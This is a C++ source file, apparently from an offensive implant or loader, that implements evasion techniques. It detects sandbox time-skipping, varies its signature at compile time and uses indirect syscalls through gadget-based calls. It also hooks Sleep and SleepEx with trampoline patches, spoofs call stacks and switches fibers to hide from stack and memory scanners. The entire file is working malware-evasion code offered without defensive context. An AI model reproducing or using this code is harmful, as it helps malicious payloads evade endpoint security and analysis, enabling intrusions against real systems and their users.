#include <includes.h>

// Used to store original bytes from Sleep/SleepEx
uint8_t originalSleepBytes[12] = { 0 };
uint8_t originalSleepExBytes[12] = { 0 };

// Create some simple compile-time polymorphism
class compileme {
private:
    static constexpr unsigned int fnv1a_hash(const char* str, unsigned int hash = 2166136261U) { return (*str ? fnv1a_hash(str + 1, (hash ^ *str) * 16777619U) : hash); }
    static constexpr unsigned int mix_entropy(unsigned int base) { return (base ^ 0x5A5A5A5A) * 2654435761U; }
    static constexpr unsigned int compileTimeRNG() { return mix_entropy(fnv1a_hash(__TIME__) ^ fnv1a_hash(__DATE__) ^ fnv1a_hash(__FILE__) ^ fnv1a_hash(__TIMESTAMP__) ^ (__COUNTER__ * 37)); }
    const unsigned int randomValue;

public:
    constexpr compileme() : randomValue(compileTimeRNG()) {} // Constructor initializes the random value at compile-time
    constexpr unsigned int GetMagicNumber() const { return randomValue; }
};

// Generate a random sleep duration between 5-10 sec
constexpr unsigned int GenerateSleepTime() {
    constexpr compileme rng;
    return (rng.GetMagicNumber() % 5000) + 5000;
}

// Check if process sleeptime is being fastforwarded
BOOL FiveHourEnergy() {
    LARGE_INTEGER frequency, startTime, endTime;
    DWORD tickStart, tickEnd;

    constexpr DWORD sleepTimeMs = GenerateSleepTime();
    constexpr double thresholdFactor = 0.7; // Assume some margin for error

    // Capture initial timestamps
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&startTime);
    tickStart = GetTickCount64();

    Sleep(sleepTimeMs);

    // Capture final timestamps
    QueryPerformanceCounter(&endTime);
    tickEnd = GetTickCount64();

    // Calculate elapsed time in milliseconds
    double elapsedHighResMs = (double)(endTime.QuadPart - startTime.QuadPart) * 1000.0 / frequency.QuadPart;
    DWORD elapsedTickMs = tickEnd - tickStart;
    
    // Check if elapsed time is much shorter than expected. Returns TRUE if time was fastforwarded.
    return (elapsedHighResMs < sleepTimeMs * thresholdFactor || elapsedTickMs < sleepTimeMs * thresholdFactor);
}

// Centralized function for modifying memory protection
VOID ModifyMemoryProtection(LPVOID address, DWORD newProtect, DWORD* oldProtect) {
    SIZE_T regionSize = sizeof(LPVOID);

    CHAR ZwPVM[] = "ZwProtectVirtualMemory";
    SyscallEntry NtProtectVirtualMemory = SSNLookup(ZwPVM);
    
    dwSSN = NtProtectVirtualMemory.SSN;
    qwJMP = NtProtectVirtualMemory.Syscall;
    gadget = GoGoGadget(callR12gadgets);

    status = (NTSTATUS)CallR12(
        (PVOID)CallMe,
        5,
        gadget,
        NtCurrentProcess(),
        &address,
        &regionSize,
        newProtect,
        oldProtect
    );

    if (!NT_SUCCESS(status))
        printf("NtProtectVirtualMemory 0x%08X\n", status);
}

// Apply a trampoline hook to a given function
VOID HookFunction(PVOID FunctionToHook, PVOID RedirectionFunction, uint8_t* originalBytes) {
    uint8_t trampolineHook[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov r10, <RedirectionFunction>
        0x41, 0xFF, 0xE2                                             // jmp r10
    };
    uint64_t hookAddress = (uint64_t)RedirectionFunction;

    gadget = GoGoGadget(callR12gadgets);
    CallR12(
        (PVOID)memcpy,
        3,
        gadget,
        &trampolineHook[2],
        &hookAddress,
        sizeof(hookAddress)
    );

    // Store original bytes before modifying the function
    gadget = GoGoGadget(callR12gadgets);
    CallR12(
        (PVOID)memcpy,
        3,
        gadget,
        (PVOID)originalBytes,
        FunctionToHook,
        sizeof(trampolineHook)
    );

    DWORD oldProtect = 0;
    SIZE_T regionSize = sizeof(trampolineHook);
    PVOID baseAddress = FunctionToHook;

    ModifyMemoryProtection(baseAddress, PAGE_READWRITE, &oldProtect);

    gadget = GoGoGadget(callR12gadgets);
    CallR12(
        (PVOID)memcpy,
        3,
        gadget,
        FunctionToHook,
        trampolineHook,
        sizeof(trampolineHook)
    );

    ModifyMemoryProtection(baseAddress, oldProtect, &oldProtect);

    return;
}

// Restore original bytes to (unhook) function
VOID RestoreOriginalBytes(PVOID FunctionToHook, uint8_t* originalBytes, SIZE_T size) {
    DWORD oldProtect;

    ModifyMemoryProtection(FunctionToHook, PAGE_READWRITE, &oldProtect);

    gadget = GoGoGadget(callR12gadgets);
    CallR12(
        (PVOID)memcpy,
        3,
        gadget,
        FunctionToHook,
        originalBytes,
        size
    );

    ModifyMemoryProtection(FunctionToHook, oldProtect, &oldProtect);

    return;
}

// Sleeping without calling Sleep()
VOID ImNotSleepingIPromise(DWORD dwMilliseconds) {
    // Set up call stack spoof
    PVOID ReturnAddress = NULL;
    PRM p = { 0 };

    BYTE sig[] = { 0xFF, 0x23 }; // jmp qword ptr [rbx]
    std::vector<PVOID> gadgets = CollectGadgets(sig, 3, (PBYTE)hNtdll);

    gadget = GoGoGadget(gadgets);
    p.trampoline = gadget;
    p.Gadget_ss = (PVOID)(ULONGLONG)CalculateStackSize(p.trampoline);

    // windows 11 seems to have different offset values
    //ReturnAddress = (PBYTE)GetProcAddress((HMODULE)hKernel32, "BaseThreadInitThunk") + 0x14;
    ReturnAddress = (PBYTE)GetProcAddress((HMODULE)hKernel32, "BaseThreadInitThunk") + 0x17;
    p.BTIT_ss = (PVOID)(ULONGLONG)CalculateStackSize(ReturnAddress);
    p.BTIT_retaddr = ReturnAddress;

    //ReturnAddress = (PBYTE)GetProcAddress((HMODULE)hNtdll, "RtlUserThreadStart") + 0x21;
    ReturnAddress = (PBYTE)GetProcAddress((HMODULE)hNtdll, "RtlUserThreadStart") + 0x2c;
    p.RUTS_ss = (PVOID)(ULONGLONG)CalculateStackSize(ReturnAddress);
    p.RUTS_retaddr = ReturnAddress;

    LARGE_INTEGER DelayInterval = { 0 };
    LONGLONG Delay = NULL;
    HANDLE hEvent = NULL;

    dwSSN = NtCreateEvent.SSN;
    qwJMP = NtCreateEvent.Syscall;
    gadget = GoGoGadget(callR12gadgets);

    status = (NTSTATUS)CallR12(
        (PVOID)CallMe,
        5,
        gadget,
        &hEvent,
        EVENT_ALL_ACCESS,
        NULL,
        0,
        FALSE
    );

    Delay = dwMilliseconds * 10000;
    DelayInterval.QuadPart = -Delay;

    p.ssn = (PVOID)(ULONGLONG)sysNtWaitForSingleObject.SSN;
    Spoof((PVOID)hEvent, (PVOID)(ULONGLONG)FALSE, (PVOID)&DelayInterval, NULL, &p, sysNtWaitForSingleObject.Syscall, (PVOID)(ULONGLONG)0);

    return;
}

// Hooked Sleep function
VOID WINAPI hookedSleep(DWORD dwMilliseconds, ...) {

    // Restore original function bytes before execution
    RestoreOriginalBytes((PVOID)Sleep, originalSleepBytes, sizeof(originalSleepBytes));

    // Switch to main fiber to hide execution from stack scanners
    gadget = GoGoGadget(callR12gadgets);
    CallR12((PVOID)SwitchToFiber, 1, gadget, mainFiber);

    // Call custom sleep function
    ImNotSleepingIPromise(dwMilliseconds);

    // Reapply the hook after execution
    HookFunction((PVOID)Sleep, (PVOID)hookedSleep, originalSleepBytes);
}

// Hooked SleepEx function
DWORD WINAPI hookedSleepEx(DWORD dwMilliseconds, BOOL bAlertable, ...) {

    // Restore original function bytes before execution
    RestoreOriginalBytes((PVOID)SleepEx, originalSleepExBytes, sizeof(originalSleepExBytes));

    // Switch to main fiber to hide execution from stack scanners
    gadget = GoGoGadget(callR12gadgets);
    CallR12((PVOID)SwitchToFiber, 1, gadget, mainFiber);

    ImNotSleepingIPromise(dwMilliseconds);

    // Reapply the hook after execution
    HookFunction((PVOID)SleepEx, (PVOID)hookedSleepEx, originalSleepExBytes);

    return 0;
}

// Hook Sleep and SleepEx
VOID ReSleep() {
    HookFunction((PVOID)Sleep, (PVOID)hookedSleep, originalSleepBytes);
    HookFunction((PVOID)SleepEx, (PVOID)hookedSleepEx, originalSleepExBytes);
}